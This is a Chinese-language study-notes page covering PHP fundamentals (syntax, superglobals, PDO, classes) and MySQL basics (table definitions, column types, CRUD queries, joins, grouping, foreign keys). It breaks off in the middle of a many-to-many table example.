<h3 id="2-PHP能做什么"><a href="#2-PHP能做什么" class="headerlink" title="2.PHP能做什么"></a>2.PHP能做什么</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">快速动态地生成HTML页面</span><br><span class="line">返回前端需要的各种类型数据</span><br><span class="line">高效处理表单数据</span><br><span class="line">安全操作服务器文件</span><br><span class="line">控制与客户端地会话Cookie/Session</span><br><span class="line">对用户行为进行授权控制</span><br><span class="line">高效安全操作数据库</span><br><span class="line">扩展加密压缩</span><br><span class="line">提供接口包括小程序app其他语言</span><br></pre></td></tr></table></figure>

<h3 id="3-程序执行流程"><a href="#3-程序执行流程" class="headerlink" title="3.程序执行流程"></a>3.程序执行流程</h3><p><img src="C:\Users\hyy\Desktop\编程语言.assets\1653028153671.png" alt="1653028153671"></p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><h3 id="1-环境介绍"><a href="#1-环境介绍" class="headerlink" title="1.环境介绍"></a>1.环境介绍</h3><h3 id="1-web"><a href="#1-web" class="headerlink" title="1.web"></a>1.web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务：apache	nginx</span><br><span class="line">PHP：多版本</span><br><span class="line">MySQL：多版本</span><br></pre></td></tr></table></figure>
<h3 id="2-环境集成包"><a href="#2-环境集成包" class="headerlink" title="2.环境集成包"></a>2.环境集成包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接用phpstudy</span><br></pre></td></tr></table></figure>
<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><h3 id="1-php程序"><a href="#1-php程序" class="headerlink" title="1.php程序"></a>1.php程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认扩展名.php可包含html,css,javascript</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php标记</span></span><br><span class="line"><span class="meta">&lt;?php</span> ... <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//语句结束符</span></span><br><span class="line">; &#123;&#125;</span><br><span class="line"><span class="comment">//注释符</span></span><br><span class="line"><span class="comment">//单行	/*多行注释*/</span></span><br><span class="line"><span class="comment">//合理使用空白符课增加代码可读性</span></span><br></pre></td></tr></table></figure>

<h3 id="2-php代码"><a href="#2-php代码" class="headerlink" title="2.php代码"></a>2.php代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo可输出一个或多个字符串，用逗号隔开</span></span><br><span class="line"><span class="comment">//print只允许输出一个字符串</span></span><br><span class="line"><span class="comment">//中文乱码</span></span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3.变量"></a>3.变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$开头,开头非数字，中间没空格</span></span><br><span class="line"><span class="comment">//=赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//标量</span></span><br><span class="line"><span class="comment">//布尔型	整型		浮点型		字符串型</span></span><br><span class="line"><span class="comment">//var_dump()显示类型打印</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;			<span class="comment">//这个可以换行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊数据类型</span></span><br><span class="line"><span class="comment">//控制NULL:表示变量没有值</span></span><br><span class="line"><span class="comment">//resource:资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$arr_1</span> = [<span class="number">2312</span>,<span class="number">31321</span>,<span class="number">312321</span>,<span class="string">&#x27;eqwe&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//多维数组</span></span><br></pre></td></tr></table></figure>

<h3 id="4-循环"><a href="#4-循环" class="headerlink" title="4.循环"></a>4.循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//键值对 arr为一个数组</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="variable">$v</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此处array为二维数组</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="variable">$v</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$kv</span> =&gt; <span class="variable">$vv</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$kv</span> . <span class="variable">$vv</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-条件判断"><a href="#5-条件判断" class="headerlink" title="5.条件判断"></a>5.条件判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三元运算符</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;hyy&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span> ? <span class="string">&#x27;woshihyy&#x27;</span> : <span class="string">&#x27;wobuzhidao woshei&#x27;</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//if()&#123;&#125;elseif()&#123;&#125;elseif()&#123;&#125;elseif()&#123;&#125;else&#123;&#125;</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;fd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sdd&#x27;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;hyy&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hyy&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-函数"><a href="#6-函数" class="headerlink" title="6.函数"></a>6.函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统内置函数见此链接</span></span><br><span class="line">file:<span class="comment">///D:/phpStudy/WWW/LearningPHP/php8%E8%AF%BE%E4%BB%B601/9.%E5%87%BD%E6%95%B0.html</span></span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun_name</span>(<span class="params">参数列表</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-运算符"><a href="#7-运算符" class="headerlink" title="7.运算符"></a>7.运算符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//同其他语言</span></span><br></pre></td></tr></table></figure>

<h3 id="8-循环"><a href="#8-循环" class="headerlink" title="8.循环"></a>8.循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//while()&#123;&#125;</span></span><br><span class="line"><span class="comment">//do&#123;&#125;while()</span></span><br><span class="line"><span class="comment">//for($int=1;$int&lt;10;$int++)&#123;&#125;</span></span><br><span class="line"><span class="comment">//continue break同其他</span></span><br></pre></td></tr></table></figure>



<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php与html混编需要php后缀</span></span><br><span class="line"><span class="comment">//php8有JIT会加快cpu运行速度</span></span><br></pre></td></tr></table></figure>

<h2 id="五-有关数据库"><a href="#五-有关数据库" class="headerlink" title="五.有关数据库"></a>五.有关数据库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	http://localhost/LearningPHP/PDO/PDO.html</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=dvwa&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$arr</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>

<h2 id="六-超全局变量"><a href="#六-超全局变量" class="headerlink" title="六.超全局变量"></a>六.超全局变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//超全局变量在php4.1.0之后被启用，是php系统中自带的变量，在一个脚本的全部作用域均可用</span></span><br><span class="line"><span class="variable">$_GET</span><span class="comment">//收集来自method=&#x27;get&#x27;表单的值</span></span><br><span class="line"><span class="variable">$_POST</span><span class="comment">//			 &#x27;post&#x27;</span></span><br><span class="line"><span class="variable">$_COOKIE</span><span class="comment">//常用于识别用户</span></span><br><span class="line"><span class="variable">$_REQUEST</span><span class="comment">//包含$_POST $_GET $_COOKIE</span></span><br><span class="line"><span class="variable">$GLOBALS</span><span class="comment">//全部变量的全局组合数组		普通变量也有</span></span><br><span class="line"><span class="variable">$_SESSION</span><span class="comment">//存储用户会话(session)的信息</span></span><br><span class="line"><span class="variable">$_FILES</span><span class="comment">//用来获取通过POST方法上传文件的相关信息</span></span><br><span class="line"><span class="variable">$_SERVER</span><span class="comment">//服务器和执行环境信息</span></span><br><span class="line"><span class="variable">$_ENV</span><span class="comment">//环境变量</span></span><br></pre></td></tr></table></figure>

<h2 id="七-类和对象"><a href="#七-类和对象" class="headerlink" title="七.类和对象"></a>七.类和对象</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;hyy01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$hyy</span> = <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br></pre></td></tr></table></figure>

<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table tb5(</span><br><span class="line">Id int not null auto_increment primary key, --不允许空	主键	自增</span><br><span class="line">name varchar(16) not null,</span><br><span class="line">age int default 3	--默认值</span><br><span class="line">)default charset=utf8</span><br><span class="line">删除表 drop table 表名</span><br><span class="line">清空表 delete from 表名;</span><br><span class="line">truncate table 表名;速度快无法回撤</span><br></pre></td></tr></table></figure>



<h3 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add 列名 类型</span><br><span class="line">修改列 alter table 表名 change 原列名 新列名 新类型;</span><br><span class="line">use hyy19;</span><br><span class="line">ALTER table hyy01 change id id int not null primary auto_increment;</span><br><span class="line">添加列</span><br><span class="line">alter table 表名 add 列名 类型;</span><br><span class="line">删除列</span><br><span class="line">alter table 表名 drop column 列名</span><br><span class="line">修改列类型</span><br><span class="line">alter table 表名 modify column 列名 类型;</span><br><span class="line">修改列默认值</span><br><span class="line">alter table 表名 alter 列名 set default 1000; </span><br><span class="line">删除列 默认值</span><br><span class="line">alter table 表名 alter 列名 drop default </span><br><span class="line">删除添加主键</span><br><span class="line">alter table 表名 add/drop primary key</span><br></pre></td></tr></table></figure>

<h3 id="列类型"><a href="#列类型" class="headerlink" title="列类型"></a>列类型</h3><h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><p>int			有符号-2e31~2e31-1</p>
<p>int unsigned		无符号0~2e32-1</p>
<p>int(5)zerofill		仅用于显示，不满5位左补零，满足正常显示</p>
<h4 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h4><p>decimal精确的小数数值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table L2(</span><br><span class="line">	id int not null primary key auto_increment,</span><br><span class="line">    salary decimal(8,2)			--数字总共8位，2位小数点</span><br><span class="line">)</span><br><span class="line">FLOAT单精度浮点数											32位</span><br><span class="line">DOUBLE双精度浮点数（非准确小数值）		64位</span><br></pre></td></tr></table></figure>

<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char(m)			定长字符串最多255，m长					无论如何是用m个字符存储</span><br><span class="line">varchar(m）	变长字符串长度最多65535个字符		实际占多少</span><br></pre></td></tr></table></figure>

<h3 id="时间相关"><a href="#时间相关" class="headerlink" title="时间相关"></a>时间相关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">datetime				存多少显示多少</span><br><span class="line">YYYY-MM-DD HH:MM:SS (1000-01-01 00:00:00/9999-12-31 23:59:59)</span><br><span class="line">timestamp				和时区有关系</span><br><span class="line">YYYY-MM-DD HH:MM:SS (1970-01-01 00:00:00/2037）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE table L5(</span><br><span class="line">  id int not null primary key auto_increment,</span><br><span class="line">  dt datetime,</span><br><span class="line">  tt timestamp</span><br><span class="line">  )default charset=utf8</span><br><span class="line">insert into L5 (dt, tt) values(&#x27;2025-11-11 11:11:12&#x27;,&#x27;2023-12-21 12:32:12&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="内置客户端操作-增删改查"><a href="#内置客户端操作-增删改查" class="headerlink" title="内置客户端操作-增删改查"></a>内置客户端操作-增删改查</h3><h4 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名（列名1，列名2，列名3） values=（&#x27;列1值‘，’列2值‘，列3值’）</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名;</span><br><span class="line">delete from 表名 where 条件;</span><br><span class="line">e.g.</span><br><span class="line">delete from tb1 where name=&#x27;wupeiji&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 列名=值；</span><br><span class="line">update 表名 set 列名=值 where 条件；</span><br><span class="line">e.g.</span><br><span class="line">update tb1 set name=&#x27;huyaoyao&#x27;;</span><br><span class="line">update tb1 set name=&#x27;huyaoyao&#x27; where id=1;</span><br></pre></td></tr></table></figure>

<h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名；</span><br><span class="line">select 列名，列名，列名 from 表名；</span><br><span class="line">select * from 表名 where 条件;</span><br></pre></td></tr></table></figure>

<h1 id="必备SQL和表的关系及授权"><a href="#必备SQL和表的关系及授权" class="headerlink" title="必备SQL和表的关系及授权"></a>必备SQL和表的关系及授权</h1><h2 id="1-必备SQL语句"><a href="#1-必备SQL语句" class="headerlink" title="1.必备SQL语句"></a>1.必备SQL语句</h2><h3 id="1-1条件"><a href="#1-1条件" class="headerlink" title="1.1条件"></a>1.1条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from info where age &gt; 30</span><br><span class="line">select * from info where id in (1, 4, 6)</span><br><span class="line">#	查询depart表id=3是否存在，存在执行前面的select</span><br><span class="line">select * from info where exists (select * from depart where id=3)</span><br><span class="line">#	括号里面是临时的表</span><br><span class="line">select * from (select * from info where id&gt;5) as t where age&gt;10</span><br></pre></td></tr></table></figure>

<h3 id="1-2通配符"><a href="#1-2通配符" class="headerlink" title="1.2通配符"></a>1.2通配符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#	%	表示n个字符</span><br><span class="line">#	_	表示1个字符</span><br><span class="line">select * from info where name like &#x27;%y%&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="1-3映射"><a href="#1-3映射" class="headerlink" title="1.3映射"></a>1.3映射</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注意看NM的位置</span><br><span class="line">select id, name as NM from info</span><br><span class="line">select id, name, 666 as num,</span><br><span class="line">	(select max(id) from depart) as mid,		-- max/min/sum</span><br><span class="line">	(select min(id) from depart) as nid,</span><br><span class="line">	age from info</span><br><span class="line">	</span><br><span class="line">select id, name,</span><br><span class="line">	(select title from depart where depart.id = info.id) as x1,</span><br><span class="line">	#</span><br><span class="line">	(select title from depart where depart.id = info.depart_id) as x2 from info;</span><br></pre></td></tr></table></figure>

<h3 id="1-4排序"><a href="#1-4排序" class="headerlink" title="1.4排序"></a>1.4排序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#desc倒序	asc顺序</span><br><span class="line">select * from info order by age desc</span><br><span class="line"></span><br><span class="line">select * from info where id&gt;6 or name like &#x27;%y&#x27; order by age, id desc</span><br></pre></td></tr></table></figure>

<h3 id="1-5取部分"><a href="#1-5取部分" class="headerlink" title="1.5取部分"></a>1.5取部分</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select * from info limit 5 offset 2; 	--从位置2开始获取前5条数据</span><br><span class="line">select * from info where id &gt; 10 order by id desc limit 3;		--先排序再取</span><br><span class="line"></span><br><span class="line">#逐页</span><br><span class="line">select * from info limit 10 offset 0;</span><br><span class="line">select * from info limit 10 offset 10;</span><br><span class="line">select * from info limit 10 offset 20;</span><br><span class="line">select * from info limit 10 offset 30;</span><br><span class="line">select * from info limit 10 offset 40;</span><br></pre></td></tr></table></figure>

<h3 id="1-6分组"><a href="#1-6分组" class="headerlink" title="1.6分组"></a>1.6分组</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> age, <span class="built_in">max</span>(id), <span class="built_in">min</span>(id), <span class="built_in">count</span>(id), <span class="built_in">sum</span>(id), <span class="built_in">avg</span>(id) <span class="keyword">from</span> info <span class="keyword">group</span> <span class="keyword">by</span> age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> age, <span class="built_in">count</span>(id) <span class="keyword">from</span> info <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">2</span> <span class="keyword">group</span> <span class="keyword">by</span> age <span class="keyword">having</span> <span class="built_in">count</span>(id) <span class="operator">&gt;</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-7左右连表"><a href="#1-7左右连表" class="headerlink" title="1.7左右连表"></a>1.7左右连表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from info left outer join depart on info.depart_id = depart.id;</span><br><span class="line">主表 left outer join 从表 on 主表.x=从表.id	#主表为主，从表为辅</span><br></pre></td></tr></table></figure>

<h3 id="1-8上下连表"><a href="#1-8上下连表" class="headerlink" title="1.8上下连表"></a>1.8上下连表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id, title from depart</span><br><span class="line">union			#自动去重（id）		union all保留原属数据</span><br><span class="line">select id, name from info</span><br></pre></td></tr></table></figure>

<h2 id="2-SQL执行顺序"><a href="#2-SQL执行顺序" class="headerlink" title="2.SQL执行顺序"></a>2.SQL执行顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">join</span><br><span class="line">on</span><br><span class="line">where</span><br><span class="line">group by</span><br><span class="line">having</span><br><span class="line">order by</span><br><span class="line">limit</span><br></pre></td></tr></table></figure>

<h2 id="3-表关系"><a href="#3-表关系" class="headerlink" title="3.表关系"></a>3.表关系</h2><h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><p>开发中需要添加外键，保证某一列的值必须是其他列中特定列已存在得到值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#创建			fk_info_depart是外键名字</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> info(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    email <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>,</span><br><span class="line">    depart_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> fk_info_depart <span class="keyword">foreign</span> key (depart_id) <span class="keyword">references</span> depart(id)</span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8</span><br><span class="line">#修改</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> <span class="keyword">constraint</span> fk_info_depart <span class="keyword">foreign</span> key info(depart_id) <span class="keyword">references</span> depart(id)</span><br><span class="line">#删除</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_info_depart</span><br></pre></td></tr></table></figure>

<h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> boy(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> girl(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> boy_girl(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    boy_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    girl_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span 